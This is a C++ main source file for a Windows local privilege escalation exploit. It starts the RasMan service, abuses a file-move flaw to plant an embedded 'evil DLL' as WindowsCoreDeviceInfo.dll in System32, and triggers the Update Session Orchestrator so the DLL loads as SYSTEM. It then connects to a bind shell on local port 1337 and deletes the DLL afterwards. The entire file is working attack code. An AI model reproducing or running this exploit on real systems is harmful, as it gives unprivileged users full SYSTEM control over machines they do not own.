// SysTracingExploit.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "resource.h"
#include "Utils.h"
#include "Exploit.h"
#include "MiniUsoClient.h"
#include "TcpClient.h"

#include <iostream>
#include <strsafe.h>

#define TEMPO 2000

int main()
{
	Utils utils;
	DWORD dwRet = 0;
	WCHAR lpTempPathBuffer[MAX_PATH];

	WCHAR lpWorkingDirectory[MAX_PATH];
	WCHAR targetDllPath[MAX_PATH];

	ZeroMemory(lpWorkingDirectory, MAX_PATH);
	ZeroMemory(targetDllPath, MAX_PATH);


	// ========================================================================
	// Check whether RASMAN is running  
	// ========================================================================
	if (utils.IsServiceRunning(L"RasMan"))
	{
		wprintf_s(L"[*] RasMan service is running.\n");
	}
	else
	{
		wprintf_s(L"[!] RasMan service is not running.\n");

		// ========================================================================
		// Start RasMan (this can be done as a low priv user)
		// ========================================================================
		if (utils.StartRasman())
		{
			wprintf_s(L"[*] RasMan has been successfully started.\n");
		}
		else
		{
			std::wcout << L"[-] Exploit failed. RasMan couldn't be started." << std::endl;
			return 1;
		}
	}


	// ========================================================================
	// Check whether IKEEXT is disabled   
	// ========================================================================
	if (utils.IsServiceDisabled(L"IKEEXT"))
	{
		wprintf_s(L"[-] Exploit failed. Ikeext service is disabled.\n");
		return 1;
	}
	else
	{
		wprintf_s(L"[*] Ikeext service is enabled.\n");
	}


	// ========================================================================
	// Run the exploit to move the DLL to C:\Windows\System32\ 
	// ========================================================================
	Exploit exploit;
	const WCHAR* targetDLLName = L"WindowsCoreDeviceInfo.dll";
	if (!exploit.Run(L"C:\\Windows\\System32\\dbghelp.dll", targetDLLName))
	{
		//wprintf_s(L"[-] Exploit failed.\n");
		return 1;
	}


	// ========================================================================
	// The evil DLL is embedded as a resource  
	// ========================================================================
	SYSTEM_INFO sysInfo;
	GetNativeSystemInfo(&sysInfo);

	HRSRC rsrc;
	HGLOBAL rsrcData;
	int targetResourceId = 0;

	switch (sysInfo.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
		targetResourceId = IDR_RCDATA1;
		wprintf_s(L"[*] Processor architecture: x64.\n");
		break;
	case PROCESSOR_ARCHITECTURE_INTEL:
		targetResourceId = IDR_RCDATA2;
		wprintf_s(L"[*] Processor architecture: x86.\n");
		break;
	default:
		wprintf_s(L"[!] Unknown processor architecture.\n");
		return 1;
	}

	rsrc = ::FindResource(NULL, MAKEINTRESOURCE(targetResourceId), RT_RCDATA);
	if (rsrc == NULL)
	{
		wprintf_s(L"[-] Exploit failed. Couldn't find resource: '%ls'. Error: %i\n", targetDLLName, GetLastError());
		return 1;
	}
	unsigned int rsrcSize = ::SizeofResource(NULL, rsrc);
	rsrcData = ::LoadResource(NULL, rsrc);
	if (rsrcData == NULL) 
	{
		wprintf_s(L"[-] Exploit failed. Couldn't load resource: '%ls'. Error: %i\n", targetDLLName, GetLastError());
		return 1;
	}
	void* pbinData = ::LockResource(rsrcData);


	// ========================================================================
	// Copy the content of the malicious DLL to the target file  
	// ========================================================================
	HANDLE hFile;
	DWORD dwBytesWritten = 0;
	exploit.GetTargetDllPath(targetDllPath, targetDLLName); // Get the actual path of the target DLL (we'll use sysnative if Wow64 process)
	hFile = CreateFile(targetDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wprintf_s(L"[-] Exploit failed. Failed to open target file: '%ls'. Error: %i\n", targetDllPath, GetLastError());
		return 1;
	}
	if (!WriteFile(hFile, (char*)pbinData, rsrcSize, &dwBytesWritten, NULL))
	{
		wprintf_s(L"[-] Exploit failed. Failed write file: '%ls'. Error: %i\n", targetDllPath, GetLastError());
		CloseHandle(hFile);
		return 1;
	}
	CloseHandle(hFile);
	wprintf_s(L"[+] Copied evil DLL to '%ls'.\n", targetDllPath);
	

	// ========================================================================
	// Use UsoDllLoader to get a shell as SYSTEM 
	// ========================================================================
	wprintf_s(L"[*] Using the Update Session Orchestrator to get code execution as SYSTEM.\n");
	TcpClient tcpClient;
	int iRes = 0;

	// Try to trigger DLL loading with 'StartScan'
	wprintf_s(L"[*] Trying UpdateOrchestrator->StartScan()\n");
	MiniUsoClient miniUsoClient;
	if (!miniUsoClient.Run(USO_STARTSCAN))
		return 1;

	// Wait a bit before trying to connect to the bind shell.
	// We might need this if the machine is slow. 
	//wprintf_s(L"[*] Waiting for the DLL to be loaded...\n");
	Sleep(TEMPO);

	iRes = tcpClient.connectTCP("127.0.0.1", "1337");

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying with UpdateOrchestrator->StartInteractiveScan()\n");
		if (!miniUsoClient.Run(USO_STARTINTERACTIVESCAN))
			return 2;

		Sleep(TEMPO);

		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[*] Retrying with UpdateOrchestrator->StartDownload()\n");
		if (!miniUsoClient.Run(USO_STARTDOWNLOAD))
			return 3;

		Sleep(TEMPO);

		iRes = tcpClient.connectTCP("127.0.0.1", "1337");
	}

	if (iRes != 0)
	{
		wprintf_s(L"[-] Exploit failed.\n");
	}

	if (!DeleteFile(targetDllPath))
	{
		wprintf_s(L"[!] Failed to delete file: '%ls'. Error: %i\n", targetDllPath, GetLastError());
	}
	else
	{
		wprintf_s(L"[*] Deleted file: '%ls'\n", targetDllPath);
	}

	wprintf_s(L"[+] Done.\n");
	
	return 0; 
}

